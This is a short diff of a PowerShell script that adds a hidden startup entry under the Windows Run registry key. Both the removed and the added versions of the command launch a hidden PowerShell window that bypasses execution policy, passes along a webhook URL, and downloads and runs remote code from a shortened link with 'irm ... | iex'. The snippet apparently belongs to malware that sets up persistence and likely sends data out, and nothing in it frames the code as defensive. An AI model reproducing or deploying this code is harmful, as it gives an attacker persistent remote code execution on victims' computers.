@@ -34,12 +34,11 @@ if ($currentDate -gt $expiryDate) {
 $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $scriptName = "Startup2"  # You can change this name if you like
 
-# Command to execute in the startup registry with Start-Process to hide PowerShell window
-$regCommand = "powershell -NoP -Ep Bypass -C `Start-Process powershell -ArgumentList '-NoP -Ep Bypass -W H -C `$dc='$webhookURL'; `$expiryDateParam='$expiryDateFormatted'; irm https://shorturl.at/R2sYz | iex' -WindowStyle Hidden`"
+# Command to execute in the startup registry
+$regCommand = "powershell -NoP -Ep Bypass -W H -C `$dc='$webhookURL'; `$expiryDateParam='$expiryDateFormatted'; irm https://shorturl.at/R2sYz | iex"
 
 # Check if the script is already added to startup to avoid duplicates
 $existingEntry = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
-
 if ($existingEntry) {
     Write-Host "Script is already added to startup." -ForegroundColor Yellow
 } else {
